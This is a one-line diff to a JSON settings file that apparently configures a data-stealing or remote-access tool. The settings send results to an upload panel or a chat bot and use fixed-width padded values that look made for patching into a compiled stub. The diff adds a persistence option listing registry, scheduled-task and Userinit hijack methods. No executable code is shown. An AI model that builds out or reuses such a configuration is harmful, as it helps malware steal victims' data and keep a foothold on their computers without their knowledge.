@@ -1,1 +1,1 @@
-{"delivery":"PANEL               ","botToken":"YOUR_BOT_TOKEN_HERE_PLACEHOLDER_12345678901234567890","chatId":"YOUR_CHAT_ID_HERE_PLACEHOLDER","panelUrl":"http://localhost:5000/api/upload                             ","secretKey":"aesthetic_secret_key_123         "}
+{"delivery":"PANEL               ","botToken":"YOUR_BOT_TOKEN_HERE_PLACEHOLDER_12345678901234567890","chatId":"YOUR_CHAT_ID_HERE_PLACEHOLDER","panelUrl":"http://localhost:5000/api/upload                             ","secretKey":"aesthetic_secret_key_123         ","persistence":"registry,scheduler,userinit      "}
